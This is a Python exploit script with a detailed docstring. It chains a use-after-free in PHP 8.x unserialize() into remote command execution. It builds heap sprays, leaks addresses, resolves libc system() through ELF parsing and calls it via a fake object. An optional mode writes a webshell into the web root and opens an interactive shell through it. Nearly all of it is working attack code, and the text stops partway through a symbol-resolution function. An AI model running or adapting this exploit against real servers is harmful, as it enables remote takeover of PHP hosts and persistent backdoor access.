#!/usr/bin/env python3
"""
PHP 8.x Serializable var_hash UAF → Remote RCE

Only uses struct member offsets stable across PHP 8.0-8.5.

Target endpoint: echo serialize(@unserialize($_REQUEST['cook']));

Vulnerability:
  zend_user_unserialize() (Zend/zend_interfaces.c:442) dispatches
  Serializable::unserialize() without incrementing BG(serialize_lock).
  A nested unserialize() inside the PHP method shares the outer var_hash.
  When the PHP code adds dynamic properties to inner-parsed objects, the
  property HashTable resizes (zend_hash_do_resize → efree(old arData)).
  The outer parser's R:N references still index into the freed arData,
  giving a use-after-free read/write primitive.

Exploitation chain:
  Phase 1 — Heap leak via R: write-through
    Spray 32 strings into freed bin-320 slot. Stale R:6..R:12 references
    trigger ZVAL_MAKE_REF which writes a zend_reference* back into the
    reclaimed spray string. Comparing output vs original reveals the
    corrupted slot → absolute heap address.

  Phase 2 — ELF header scan (2MB aligned near heap)
    From the heap address, scan outward at 2MB alignment looking for
    ELF magic (e_ehsize=64, e_phentsize=56). libphp.so, libc.so, and
    ld-linux.so are all mmap'd nearby. Uses IS_STRING type confusion
    reads (see isstring_read below).

  Phase 3 — Dynamic symbol resolution
    For each ELF candidate, parse PT_DYNAMIC → DT_GNU_HASH/DT_SYMTAB/
    DT_STRTAB and resolve symbols. From libphp: executor_globals,
    compiler_globals, std_object_handlers. From libc: system().
    Falls back to link_map chain walk or GOT pointer chasing if the
    initial 2MB scan misses a DSO.

  Phase 4 — Read EG.function_table
    executor_globals is in .bss. Read function_table and class_table
    pointers from EG using BSS len-anchor scanning (looking for non-zero
    qwords usable as IS_STRING len fields).

  Phase 5 — system() from libc (resolved in Phase 3)
    libc system() takes one argument (the command string), no need
    to set up zend_execute_data. The get_properties_for vtable slot
    receives the fake object pointer as first arg, so system(obj) just
    works with the command embedded at the start of the object.

  Phase 6 — Spray slot discovery via ZMM chunk metadata
    Read the ZendMM chunk header (page map at chunk+0x250) to find
    bin-320 SRUN pages. Probe slots within the run to find a spray
    string (identified by len=280). This gives us the absolute address
    of spray content we control (S).

  Phase 7 — IS_OBJECT type confusion → RCE
    Final UAF trigger: spray strings contain a fake zend_object and
    fake zend_object_handlers. The stale R:6 reference reads from
    Bucket[1] in the reclaimed spray, which we set to IS_OBJECT type
    with value pointing to our fake object. When serialize() runs on
    this "object", it calls handlers->get_properties_for (vtable+0xC8),
    which we point to libc system(). The fake object starts with the
    command string, so system(obj) executes our command.

    The GC_ADDREF issue: serialize calls php_add_var_hash which does
    GC_ADDREF(obj), incrementing the uint32 at obj+0x00. We place a
    tab character (0x09) at byte 0 so after +1 it becomes 0x0A (newline),
    and the command string starting at byte 1 is passed to sh.

Apache prefork memory model:
  All workers share .text/.data/.bss addresses (forked from parent).
  IS_STRING reads may crash individual workers (huge len field), but
  addresses remain valid across worker respawns. Crash-and-retry is
  the fundamental strategy.

Usage:
  python3 test_full_chain.py --port 8081
  python3 test_full_chain.py --port 8081 --cmd 'touch /tmp/pwn'
  python3 test_full_chain.py --port 8081 --shell

  Default command is "id>/dev/shm/x" (14 bytes, the maximum).
  To verify when the target runs in Docker:
    docker exec <container> cat /dev/shm/x

  --shell mode drops a webshell (<?=shell_exec($_GET[1])?>) to the
  DocumentRoot via 16 chained RCE triggers, each writing a few bytes.
  Access via: curl 'http://target/c.php?1=id'
"""
import struct, socket, time, sys

# ── Spray geometry ──────────────────────────────────────────────────
# These match the bin-320 allocator slot size and the CachedData trigger.
SPRAY_LEN = 280       # zend_string content length → 280 + 24 header = 304 → bin-320
SPRAY_COUNT = 32      # number of spray strings per payload
NUM_PROPS = 7         # inner stdClass properties (fills nTableSize=8)
REF_BASE = 6          # first stale R: index (R:6 → Bucket[1] in freed arData)
MAX_REFS = 7          # R:6..R:12 → Bucket[1]..Bucket[7]

def build_inner():
    """Build the serialized payload for CachedData::unserialize().

    Creates a:1:{s:5:"items";a:1:{i:0;O:8:"stdClass":7:{...}}} — a stdClass
    with 7 properties that fills nTableSize=8. When CachedData::unserialize()
    then adds 10 dynamic properties ($row->_c1.._c10), the HT resizes from
    nTableSize=8 to 16, calling efree(old arData). The outer var_hash still
    holds pointers into that freed arData.
    """
    props = ''
    for k in range(NUM_PROPS):
        pname = f"p{k}"
        props += f's:{len(pname)}:"{pname}";i:{0xAAAA0000 + k};'
    return (f'a:1:{{s:5:"items";a:1:{{i:0;O:8:"stdClass":{NUM_PROPS}:'
            f'{{{props}}}}}}}')

INNER = build_inner()
# C: token invokes Serializable::unserialize() — the entry point to the bug
C_PART = f'C:10:"CachedData":{len(INNER)}:{{{INNER}}}'

def urlencode_bytes(data):
    """URL-encode raw bytes, preserving only unreserved characters."""
    out = bytearray()
    for b in data:
        if (0x30 <= b <= 0x39 or 0x41 <= b <= 0x5A or
                0x61 <= b <= 0x7A or b in (0x2D, 0x2E, 0x5F, 0x7E)):
            out.append(b)
        else:
            out.extend(f'%{b:02X}'.encode())
    return bytes(out)

req_count = 0

def send_http(payload, host=None, port=None, timeout=3):
    """Send a serialized payload as POST body (cook=...) and return response body."""
    if host is None: host = HOST
    if port is None: port = PORT
    global req_count
    req_count += 1
    body = b'cook=' + urlencode_bytes(payload)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    for attempt in range(2):
        try:
            s.connect((host, port))
            break
        except:
            if attempt == 0:
                time.sleep(0.2)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
    req = (
        f"POST /remote_app.php HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode() + body
    try:
        s.sendall(req)
    except:
        return None
    resp = b''
    while True:
        try:
            chunk = s.recv(65536)
            if not chunk:
                break
            resp += chunk
        except:
            break
    s.close()
    if b'\r\n\r\n' in resp:
        hdr, body_data = resp.split(b'\r\n\r\n', 1)
        if b' 500 ' in hdr.split(b'\r\n')[0]:
            return None
        return body_data
    return resp

crash_count = 0

def isstring_read(fake_str_addr, timeout=5):
    """Arbitrary read primitive via IS_STRING type confusion.

    The core building block for every remote phase. Layout:

      Spray string content (280 bytes) overlaps freed arData's Bucket array.
      Bucket layout: val(8) + type_info(4) + pad(4) + h(8) + key(8) = 32 bytes
      arData starts with 8 bytes of hash slots, then Bucket[0], Bucket[1], ...

      We set Bucket[1] (offset 40 in spray content):
        val   = fake_str_addr    (treated as zend_string* by the engine)
        type  = 0x06             (IS_STRING)

      The stale R:6 reference resolves to Bucket[1]. The engine sees IS_STRING
      and calls serialize on it, reading zend_string.len (+0x10) and .val (+0x18)
      from fake_str_addr. The serialized output contains len bytes starting at
      fake_str_addr + 0x18 — arbitrary memory read.

      Crash behavior: if fake_str_addr + 0x10 points to a huge value or unmapped
      memory, the worker segfaults. Apache prefork spawns a replacement, and all
      .text/.data/.bss addresses remain valid. We just retry.

    Returns (len, data) or None on crash.
    """
    global crash_count
    spray = bytearray(SPRAY_LEN)
    # Fill all buckets with IS_LONG (0x04) markers as baseline
    for k in range(8):
        vo = 8 + k * 32
        struct.pack_into('<I', spray, vo, 0xBBBB0000 + k)
        struct.pack_into('<I', spray, vo + 8, 0x04)       # IS_LONG
    # Override Bucket[1] with IS_STRING pointing to target
    vo = 8 + 1 * 32
    struct.pack_into('<Q', spray, vo, fake_str_addr)       # val = target address
    struct.pack_into('<I', spray, vo + 8, 0x06)            # IS_STRING
    spray = bytes(spray)
    # Build payload: CachedData trigger + 32 spray strings + 1 stale reference
    total = 1 + SPRAY_COUNT + 1
    parts = [f'i:0;{C_PART}'.encode('latin-1')]
    for i in range(SPRAY_COUNT):
        parts.append(f'i:{i+1};s:{SPRAY_LEN}:"'.encode('latin-1') + spray + b'";')
    parts.append(f'i:{SPRAY_COUNT+1};R:{REF_BASE};'.encode('latin-1'))
    payload = b'a:' + str(total).encode() + b':{' + b''.join(parts) + b'}'
    output = send_http(payload, timeout=timeout)
    if output is None:
        crash_count += 1
        if crash_count % 5 == 0:
            time.sleep(0.5)       # back off after repeated crashes
        return None
    idx = output.find(b'a:')
    if idx < 0:
        return None
    output = output[idx:]
    # Parse the confused string entry from serialize output
    key = f'i:{SPRAY_COUNT+1};s:'.encode()
    pos = output.find(key)
    if pos >= 0:
        pos += len(key)
        colon = output.index(b':', pos)
        slen = int(output[pos:colon])
        dstart = colon + 2
        dend = dstart + slen
        if dend <= len(output):
            return (slen, output[dstart:dend])
        return (slen, output[dstart:])
    return None

def heap_leak():
    """Phase 1: Leak a heap address via ZVAL_MAKE_REF write-through.

    Triggers the UAF and sprays 32 identical strings into the freed bin-320 slot.
    Then uses 7 stale R: references (R:6..R:12) to read from Bucket[1]..Bucket[7].

    When the outer unserializer processes R:6 and the target zval has IS_LONG type,
    it calls ZVAL_MAKE_REF which:
      1. Allocates a new zend_reference (24 bytes, bin-32)
      2. Writes the reference pointer + IS_REFERENCE type_info back into the
         stale zval location — which is inside our spray string's content

    By comparing each spray string in the serialize output against the original,
    we detect which string reclaimed the freed arData and extract the zend_reference
    heap pointer from the corrupted bucket.
    """
    spray = bytearray(SPRAY_LEN)
    # Fill all buckets with known IS_LONG markers
    for k in range(8):
        vo = 8 + k * 32
        struct.pack_into('<I', spray, vo, 0xBBBB0000 + k)
        struct.pack_into('<I', spray, vo + 8, 0x04)       # IS_LONG
    spray = bytes(spray)
    # Payload: trigger + spray + 7 stale references
    total = 1 + SPRAY_COUNT + MAX_REFS
    parts = [f'i:0;{C_PART}'.encode('latin-1')]
    for i in range(SPRAY_COUNT):
        parts.append(f'i:{i+1};s:{SPRAY_LEN}:"'.encode('latin-1') + spray + b'";')
    for k in range(MAX_REFS):
        parts.append(f'i:{SPRAY_COUNT+1+k};R:{REF_BASE+k};'.encode('latin-1'))
    payload = b'a:' + str(total).encode() + b':{' + b''.join(parts) + b'}'
    output = send_http(payload)
    if output is None:
        return None
    idx = output.find(b'a:')
    if idx < 0:
        return None
    output = output[idx:]
    # Scan output for spray strings with corrupted bucket values
    search_pos = 0
    while True:
        pos = output.find(b's:280:"', search_pos)
        if pos < 0:
            break
        dstart = pos + 7
        if dstart + SPRAY_LEN > len(output):
            break
        sdata = output[dstart:dstart + SPRAY_LEN]
        for k in range(7):
            bucket_idx = k + 1
            vo = 8 + bucket_idx * 32
            if vo + 8 > len(sdata):
                break
            orig = struct.unpack_from('<Q', spray, vo)[0]
            curr = struct.unpack_from('<Q', sdata, vo)[0]
            # If value changed and looks like a valid pointer, it's the leaked ref
            if orig != curr and curr > 0x10000:
                return curr
        search_pos = dstart + SPRAY_LEN
    return None

def gnu_hash_func(name):
    """DJB hash used by ELF .gnu.hash sections."""
    h = 5381
    for c in name:
        h = (h * 33 + c) & 0xFFFFFFFF
    return h

def gnu_hash_lookup_window(wdata, wbase, gh_addr, symtab, strtab, names):
    """Resolve symbol names via .gnu.hash using a pre-read memory window.

    Walks the bloom filter, bucket array, and hash chain to find each name
    in the ELF's exported symbol table. Returns {name: offset} for matches.
    """
    def rd(addr, sz):
        off = addr - wbase
        if off < 0 or off + sz > len(wdata):
            return None
        return wdata[off:off+sz]

    hdr = rd(gh_addr, 16)
    if hdr is None:
        return {}
    nbuckets, symoffset, bloom_size, bloom_shift = struct.unpack('<IIII', hdr)
    bloom_addr = gh_addr + 16
    buckets_addr = bloom_addr + 8 * bloom_size
    chain_addr = buckets_addr + 4 * nbuckets
    results = {}

    for name in names:
        nb = name.encode('latin-1')
        h = gnu_hash_func(nb)
        wi = (h // 64) % bloom_size
        bw = rd(bloom_addr + 8 * wi, 8)
        if bw is None:
            continue
        bword = struct.unpack('<Q', bw)[0]
        if (bword & ((1 << (h & 63)) | (1 << ((h >> bloom_shift) & 63)))) != \
           ((1 << (h & 63)) | (1 << ((h >> bloom_shift) & 63))):
            continue
        bk = rd(buckets_addr + 4 * (h % nbuckets), 4)
        if bk is None:
            continue
        si = struct.unpack('<I', bk)[0]
        if si == 0:
            continue
        for _ in range(64):
            chv = rd(chain_addr + 4 * (si - symoffset), 4)
            if chv is None:
                break
            cv = struct.unpack('<I', chv)[0]
            if (cv | 1) == (h | 1):
                sym = rd(symtab + 24 * si, 24)
                if sym is None:
                    break
                st_name = struct.unpack_from('<I', sym, 0)[0]
                st_value = struct.unpack_from('<Q', sym, 8)[0]
                nm = rd(strtab + st_name, len(nb) + 1)
                if nm and nm[:len(nb)] == nb and nm[len(nb):len(nb)+1] == b'\x00':
                    results[name] = st_value
                    break
            if cv & 1:
                break
            si += 1
    return results

def php_djb_hash(key):
    """DJBX33A hash used by PHP's HashTable (zend_hash). 64-bit version."""
    h = 5381
    for c in key:
        h = ((h << 5) + h + c) & 0xFFFFFFFFFFFFFFFF
    return h

HOST = '127.0.0.1'
PORT = 8080
DEFAULT_WEBSHELL = '<?=shell_exec($_GET[1])?>'


def build_rce_payload(cmd_bytes, std_class_ce, system_addr, S):
    """Build the UAF spray payload that triggers system(cmd) via IS_OBJECT confusion."""
    CMD = b"\x09" + cmd_bytes
    assert len(CMD) <= 15, f"command too long: {len(CMD)-1} bytes (max 14)"

    rce_spray = bytearray(SPRAY_LEN)
    fake_obj_addr = S + 104

    struct.pack_into('<Q', rce_spray, 40, fake_obj_addr)
    struct.pack_into('<I', rce_spray, 48, 0x08)

    rce_spray[104:104 + len(CMD)] = CMD
    rce_spray[104 + len(CMD)] = 0
    struct.pack_into('<Q', rce_spray, 120, std_class_ce)
    struct.pack_into('<Q', rce_spray, 128, S)
    struct.pack_into('<Q', rce_spray, 136, 1)
    struct.pack_into('<Q', rce_spray, 200, system_addr)

    rce_spray = bytes(rce_spray)
    total = 1 + SPRAY_COUNT + 1
    parts = [f'i:0;{C_PART}'.encode('latin-1')]
    for i in range(SPRAY_COUNT):
        parts.append(f'i:{i+1};s:{SPRAY_LEN}:"'.encode('latin-1') + rce_spray + b'";')
    parts.append(f'i:{SPRAY_COUNT+1};R:{REF_BASE};'.encode('latin-1'))
    return b'a:' + str(total).encode() + b':{' + b''.join(parts) + b'}'


def fire_rce(cmd_str, std_class_ce, system_addr, S):
    """Send one RCE payload that executes cmd_str via system()."""
    payload = build_rce_payload(cmd_str.encode('latin-1'), std_class_ce, system_addr, S)
    output = send_http(payload)
    time.sleep(0.3)
    return output


SHELL_SPECIAL = set('<>?$`[](){};&|!*#~"\'\\ \t')

def make_append_commands(webshell, staging_file='w'):
    r"""Split webshell into 'echo -n ...' commands, each <= 14 bytes.

    Safe chars:    "echo -n XXX>>w"  (up to 3 content chars)
    Special chars: "echo -n \X>>w"   (1 content char with backslash escape)

    A special char followed by safe chars can share a command:
      "echo -n \?=>>w"  (14 bytes, writes "?=")
    """
    cmds = []
    i = 0
    overhead = len(f'echo -n >>{staging_file}')

    while i < len(webshell):
        c = webshell[i]

        if c in SHELL_SPECIAL:
            content = f'\\{c}'
            i += 1
            budget = 14 - overhead - len(content)
            while budget > 0 and i < len(webshell) and webshell[i] not in SHELL_SPECIAL:
                content += webshell[i]
                i += 1
                budget -= 1
        else:
            budget = 14 - overhead
            content = ''
            while budget > 0 and i < len(webshell) and webshell[i] not in SHELL_SPECIAL:
                content += webshell[i]
                i += 1
                budget -= 1

        cmd = f'echo -n {content}>>{staging_file}'
        assert len(cmd) <= 14, f"BUG: {cmd!r} is {len(cmd)} bytes"
        cmds.append(cmd)

    return cmds


def drop_shell(std_class_ce, system_addr, S, webshell='<?=shell_exec($_GET[1])?>',
               filename='c.php'):
    """Multi-stage webshell drop: build PHP file char-by-char via repeated RCE.

    Apache CWD is the DocumentRoot, so "echo -n X>>w" writes into the webroot.
    Each RCE trigger appends up to 3 chars; a final "mv w <filename>" renames it.
    """
    staging = 'w'
    append_cmds = make_append_commands(webshell, staging)
    rename_cmd = f'mv {staging} {filename}'
    assert len(rename_cmd) <= 14, f"rename too long: {rename_cmd!r} ({len(rename_cmd)} bytes)"
    all_cmds = [f'rm -f {staging}'] + append_cmds + [rename_cmd]

    print(f"\n[Phase 8] Dropping webshell ({len(all_cmds)} RCE triggers)")
    print(f"  Webshell: {webshell}")
    print(f"  Filename: {filename}")
    for i, cmd in enumerate(all_cmds):
        print(f"    [{i+1}/{len(all_cmds)}] {cmd}")
        fire_rce(cmd, std_class_ce, system_addr, S)

    time.sleep(0.5)
    webshell_url = f'http://{HOST}:{PORT}/{filename}'
    print(f"\n  Verifying webshell at {webshell_url}")

    import urllib.request, urllib.parse
    try:
        resp = urllib.request.urlopen(webshell_url + '?1=id', timeout=5).read()
        result = resp.decode('utf-8', errors='replace').strip()
        print(f"\n{'='*60}")
        print(f"  WEBSHELL DEPLOYED: {webshell_url}")
        print(f"  Verification (id): {result}")
        print(f"{'='*60}")
        print(f"\n[*] Total requests: {req_count}")
        print(f"\nInteractive shell (type 'exit' to quit):")
        while True:
            try:
                cmd = input("$ ")
            except (EOFError, KeyboardInterrupt):
                break
            if cmd.strip() == 'exit':
                break
            try:
                url = webshell_url + '?1=' + urllib.parse.quote(cmd)
                r = urllib.request.urlopen(url, timeout=10).read()
                print(r.decode('utf-8', errors='replace'), end='')
            except Exception as e:
                print(f"Error: {e}")
    except Exception as e:
        print(f"\n  Webshell not reachable: {e}")
        print(f"  www-data may lack write permission to DocumentRoot")


def main():
    global HOST, PORT
    import argparse
    parser = argparse.ArgumentParser(description='PHP 8.x Serializable var_hash UAF → RCE')
    parser.add_argument('--cmd', default=None, help='Custom command (max 14 chars). Default: id>/dev/shm/x')
    parser.add_argument('--shell', action='store_true',
                        help='Drop a webshell to the DocumentRoot via multi-stage RCE')
    parser.add_argument('--host', default='127.0.0.1', help='Target host (default: 127.0.0.1)')
    parser.add_argument('--port', type=int, default=8080, help='Target port (default: 8080)')
    parser.add_argument('--resolve-only', action='store_true',
                        help='Print resolved addresses as JSON and exit (no RCE)')
    args = parser.parse_args()
    HOST = args.host
    PORT = args.port

    print("=" * 60)
    print("  Full chain: heap → ELF → CG → system() → RCE")
    print(f"  Target: {HOST}:{PORT}")
    print("=" * 60)

    # ── Phase 1: Heap leak ────────────────────────────────────────────
    # Trigger the UAF and use ZVAL_MAKE_REF write-through to leak a
    # zend_reference pointer from the heap. The 2MB-aligned chunk base
    # is our starting point for scanning mapped DSOs.
    print("\n[Phase 1] Heap leak")
    heap_ref = heap_leak()
    if not heap_ref:
        print("FAILED"); return
    chunk = heap_ref & 0xFFFFFFFFFFE00000
    print(f"  heap_ref = 0x{heap_ref:x}")

    # ── Phase 2: ELF header scan ──────────────────────────────────────
    # DSOs are mmap'd at 2MB-aligned addresses. Scan outward from the heap
    # chunk base, probing each 2MB boundary for ELF headers. Identify each
    # by reading bytes at offset +0x10 (after the 16-byte ELF magic) and
    # checking e_ehsize=64, e_phentsize=56, reasonable e_phnum.
    print("\n[Phase 2] ELF scan (2MB aligned, near heap)")
    elf_candidates = []
    for i in range(256):
        for d in [1, -1]:
            cand = chunk + d * i * 0x200000
            if cand <= 0 or cand > 0x7FFFFFFFFFFF:
                continue
            fake_str = cand + 0x10
            r = isstring_read(fake_str, timeout=3)
            if r is None:
                continue
            slen, sdata = r
            if slen != 64 or len(sdata) < 0x12:
                continue
            e_ehsize = struct.unpack_from('<H', sdata, 0x0C)[0]
            e_phentsize = struct.unpack_from('<H', sdata, 0x0E)[0]
            e_phnum = struct.unpack_from('<H', sdata, 0x10)[0]
            if e_ehsize == 64 and e_phentsize == 56 and 3 <= e_phnum <= 20:
                elf_candidates.append((cand, e_phnum))
                print(f"  ELF @ 0x{cand:x} phnum={e_phnum} ({req_count} reqs)")
        big = [epn for _, epn in elf_candidates if epn >= 10]
        if len(big) >= 2:
            break
        if len(elf_candidates) >= 8:
            break

    if not elf_candidates:
        print("  No ELF found"); return

    # ── Phase 2.5: Fine-grained 1MB scan near found ELFs ─────────────
    # Some DSOs (especially libc) may not be 2MB-aligned. Do a finer
    # sweep near the ELF with the most phdrs (likely libphp).
    known_bases = set(b for b, _ in elf_candidates)
    ref_base = max(elf_candidates, key=lambda x: x[1])[0]
    print(f"\n[Phase 2.5] Fine-grained scan near 0x{ref_base:x}")
    def check_elf(addr):
        if addr in known_bases or addr <= 0:
            return None
        r = isstring_read(addr + 0x10, timeout=2)
        if r is None:
            return None
        slen, sdata = r
        if slen != 64 or len(sdata) < 0x12:
            return None
        eh = struct.unpack_from('<H', sdata, 0x0C)[0]
        eph = struct.unpack_from('<H', sdata, 0x0E)[0]
        epn = struct.unpack_from('<H', sdata, 0x10)[0]
        if eh == 64 and eph == 56 and 3 <= epn <= 20:
            return epn
        return None
    for d in [-1, 1]:
        consec_miss = 0
        for step in range(1, 129):
            cand = ref_base + d * step * 0x100000
            epn = check_elf(cand)
            if epn is not None:
                elf_candidates.append((cand, epn))
                known_bases.add(cand)
                print(f"  ELF @ 0x{cand:x} phnum={epn} ({req_count} reqs)")
                consec_miss = 0
                if epn >= 10:
                    break
            else:
                consec_miss += 1
                if consec_miss >= 32:
                    break

    # ── Phase 3: Symbol resolution ────────────────────────────────────
    # For each ELF candidate, use phdr fields as IS_STRING len anchors to
    # read a large memory window, then parse .gnu.hash to resolve symbols.
    # From libphp: executor_globals, compiler_globals, std_object_handlers
    # From libc: system()
    print("\n[Phase 3] Symbol resolution")

    def elf_read_window(base, phnum):
        """Read a large memory window from an ELF using IS_STRING len confusion.

        The trick: ELF program headers contain fields like p_align (e.g. 0x200000),
        p_filesz, and p_memsz that are reasonable IS_STRING lengths. By pointing
        isstring_read at (field_addr - 0x10), the engine reads field value as
        zend_string.len and returns field_addr+0x08 onward — giving us a window
        of that many bytes covering the ELF's .gnu.hash, .dynsym, .dynstr, etc.

        Returns (window_base_addr, window_data, window_len) or None.
        """
        phdr_data = None
        phdr_data_base = None
        for pi in range(3):
            for foff in (0x30, 0x20, 0x28):  # p_align, p_filesz, p_memsz
                field_addr = base + 0x40 + pi * 56 + foff
                fs = field_addr - 0x10
                sys.stdout.write(f"      [win] phdr[{pi}]+0x{foff:x} @ 0x{fs:x}...")
                sys.stdout.flush()
                r = isstring_read(fs, timeout=3)
                if r is None:
                    print(" FAIL")
                    continue
                else:
                    print(f" len={r[0]} got={len(r[1])}")
                slen, sdata = r
                if slen >= 56 and len(sdata) >= 56:
                    phdr_data = sdata
                    phdr_data_base = fs + 0x18
                    break
            if phdr_data is not None:
                break
        if phdr_data is None:
            return None

        # For each phdr, try using p_filesz(+0x20), p_memsz(+0x28), p_align(+0x30)
        # Collect all candidates sorted by value, try each until one works
        candidates = []
        for i in range(phnum):
            phdr_addr = base + 0x40 + i * 56
            off = phdr_addr - phdr_data_base
            if off < 0 or off + 56 > len(phdr_data):
                continue
            p_type = struct.unpack_from('<I', phdr_data, off)[0]
            if p_type not in (1, 6):  # PT_LOAD or PT_PHDR
                continue
            for field_off in (0x30, 0x20, 0x28):  # p_align, p_filesz, p_memsz
                field_addr = phdr_addr + field_off
                val_off = field_addr - phdr_data_base
                if val_off < 0 or val_off + 8 > len(phdr_data):
                    continue
                val = struct.unpack_from('<Q', phdr_data, val_off)[0]
                if val >= 0x1000 and val < 0x10000000:
                    candidates.append((field_addr, val, i, field_off))

        if not candidates:
            return None

        # Try candidates: prefer moderate sizes (avoid huge reads that may cross gaps)
        # Sort by: prefer 0x10000-0x400000 range, then by descending size
        def sort_key(c):
            v = c[1]
            if 0x10000 <= v <= 0x400000:
                return (0, -v)
            return (1, -v)
        candidates.sort(key=sort_key)

        for field_addr, expected_len, phdr_idx, field_off in candidates[:5]:
            sys.stdout.write(f"      [win] cand phdr[{phdr_idx}]+0x{field_off:x} val=0x{expected_len:x}...")
            sys.stdout.flush()
            r = isstring_read(field_addr - 0x10, timeout=3)
            if r is None:
                print(" FAIL")
                continue
            wlen, wdata = r
            wbase = field_addr + 8
            print(f" len=0x{wlen:x} got={len(wdata)}")
            if len(wdata) >= 0x1000:
                return (wbase, wdata, wlen)
        return None

    def elf_resolve_symbols(base, phnum, names, debug=False):
        """Resolve symbols from an ELF's .gnu_hash + PT_DYNAMIC. Returns dict or None."""
        win = elf_read_window(base, phnum)
        if win is None:
            if debug: print(f"      [dbg] elf_read_window returned None")
            return None
        wbase, wdata, wlen = win
        if debug: print(f"      [dbg] window: wbase=0x{wbase:x} len={len(wdata)} wlen={wlen}")

        def rd(addr, sz):
            off = addr - wbase
            if off < 0 or off + sz > len(wdata):
                return None
            return wdata[off:off+sz]

        # Find PT_DYNAMIC from phdrs to get DT_SYMTAB and DT_STRTAB
        symtab = None
        strtab = None
        gnu_hash_addr = None

        # Read phdrs to find PT_DYNAMIC (p_type=2)
        dyn_addr = None
        dyn_size = 0
        for pi in range(phnum):
            phdr_addr = base + 0x40 + pi * 56
            phdr_raw = rd(phdr_addr, 56)
            if phdr_raw is None:
                continue
            p_type = struct.unpack_from('<I', phdr_raw, 0)[0]
            if p_type == 2:  # PT_DYNAMIC
                p_vaddr = struct.unpack_from('<Q', phdr_raw, 16)[0]
                p_filesz = struct.unpack_from('<Q', phdr_raw, 32)[0]
                dyn_addr = base + p_vaddr
                dyn_size = p_filesz
                break

        if dyn_addr is not None:
            if debug: print(f"      [dbg] PT_DYNAMIC @ 0x{dyn_addr:x} size={dyn_size}")
            # Read dynamic section: try window first, then bulk isstring_read
            dyn_data = rd(dyn_addr, min(dyn_size, 4096))
            if dyn_data is None:
                # Outside window — try using d_val of first entry as len anchor
                # .dynamic[0] = (d_tag=1 DT_NEEDED, d_val=small_strtab_offset)
                # isstring_read(dyn_addr - 0x08): len=d_val, data from dyn_addr+0x10
                for anchor_off in [0x08, 0x18, 0x28, 0x38, 0x48]:
                    r = isstring_read(dyn_addr - anchor_off, timeout=3)
                    if r is None:
                        continue
                    slen, sdata = r
                    if slen < 64 or slen > 0x200000 or len(sdata) < 64:
                        continue
                    skip = anchor_off - 0x18
                    if skip < 0:
                        skip = 0
                    data_start = max(0, skip)
                    dyn_data = sdata[data_start:data_start + min(dyn_size, len(sdata) - data_start)]
                    # Validate: first few entries should have reasonable d_tag values (1-32 or known high tags)
                    if len(dyn_data) >= 16:
                        tag0 = struct.unpack_from('<Q', dyn_data, 0)[0]
                        if tag0 == 0 or (tag0 > 100 and tag0 < 0x6FFFFEF5):
                            dyn_data = None
                            continue
                    if debug: print(f"      [dbg] .dynamic via anchor -0x{anchor_off:x}: len={slen} skip={data_start} got={len(dyn_data)}")
                    break

            pltgot_addr = None
            if dyn_data and len(dyn_data) >= 32:
                for di in range(len(dyn_data) // 16):
                    d_tag = struct.unpack_from('<Q', dyn_data, di * 16)[0]
                    d_val = struct.unpack_from('<Q', dyn_data, di * 16 + 8)[0]
                    if d_tag == 0:  # DT_NULL
                        break
                    elif d_tag == 3:  # DT_PLTGOT
                        pltgot_addr = base + d_val if d_val < 0x10000000 else d_val
                    elif d_tag == 5:  # DT_STRTAB
                        strtab = base + d_val if d_val < 0x10000000 else d_val
                    elif d_tag == 6:  # DT_SYMTAB
                        symtab = base + d_val if d_val < 0x10000000 else d_val
                    elif d_tag == 0x6FFFFEF5:  # DT_GNU_HASH
                        gnu_hash_addr = base + d_val if d_val < 0x10000000 else d_val

        if symtab and (symtab < base or symtab > base + 0x2000000):
            if debug: print(f"      [dbg] symtab 0x{symtab:x} outside range, discarding")
            symtab = None
        if strtab and (strtab < base or strtab > base + 0x2000000):
            if debug: print(f"      [dbg] strtab 0x{strtab:x} outside range, discarding")
            strtab = None
        if gnu_hash_addr and (gnu_hash_addr < base or gnu_hash_addr > base + 0x2000000):
            if debug: print(f"      [dbg] gnu_hash 0x{gnu_hash_addr:x} outside range, discarding")
            gnu_hash_addr = None

        if debug:
            if symtab: print(f"      [dbg] symtab=0x{symtab:x}")
            if strtab: print(f"      [dbg] strtab=0x{strtab:x}")
            if gnu_hash_addr: print(f"      [dbg] .gnu_hash @ 0x{gnu_hash_addr:x}")

        # Fallback: scan for .gnu_hash signature in window
        if gnu_hash_addr is None:
            for scan_off in range(0, min(len(wdata) - 16, 0x10000), 4):
                nb, so, bs, bsh = struct.unpack_from('<IIII', wdata, scan_off)
                if not (100 < nb < 100000 and 10 < so < 1000000 and 4 <= bs <= 8192 and 1 <= bsh < 64):
                    continue
                if bs & (bs - 1) != 0:
                    continue
                bloom_end = scan_off + 16 + 8 * bs
                if bloom_end + 4 * nb > len(wdata):
                    continue
                b0 = struct.unpack_from('<I', wdata, bloom_end)[0]
                if b0 != 0 and (b0 < so or b0 > so + 1000000):
                    continue
                gnu_hash_addr = wbase + scan_off
                if debug: print(f"      [dbg] .gnu_hash (scan) @ 0x{gnu_hash_addr:x}")
                break

        if gnu_hash_addr is None:
            if debug: print(f"      [dbg] .gnu_hash not found")
            return None

        # Fallback for symtab/strtab: compute from .gnu_hash chain end
        if symtab is None or strtab is None:
            gh_hdr = rd(gnu_hash_addr, 16)
            if gh_hdr is None:
                return None
            nbuckets, symoffset, bloom_size, bloom_shift = struct.unpack('<IIII', gh_hdr)
            bloom_start = gnu_hash_addr + 16
            buckets_start = bloom_start + 8 * bloom_size
            chains_start = buckets_start + 4 * nbuckets
            max_si = 0
            for b in range(nbuckets):
                bv = rd(buckets_start + 4*b, 4)
                if bv is None: continue
                si = struct.unpack('<I', bv)[0]
                if si > max_si: max_si = si
            si = max_si
            while si > 0:
                cv = rd(chains_start + 4*(si - symoffset), 4)
                if cv is None: break
                if struct.unpack('<I', cv)[0] & 1: break
                si += 1
            nsyms = si + 1
            if symtab is None:
                chains_end = chains_start + 4 * (nsyms - symoffset)
                symtab = (chains_end + 7) & ~7
            if strtab is None:
                strtab = symtab + 24 * nsyms

        st_off = strtab - wbase
        sy_off = symtab - wbase
        if debug: print(f"      [dbg] symtab=0x{symtab:x} strtab=0x{strtab:x}")

        # If symtab/strtab are outside window, try reading via isstring_read
        # We need enough of the window to cover gnu_hash + symtab + strtab
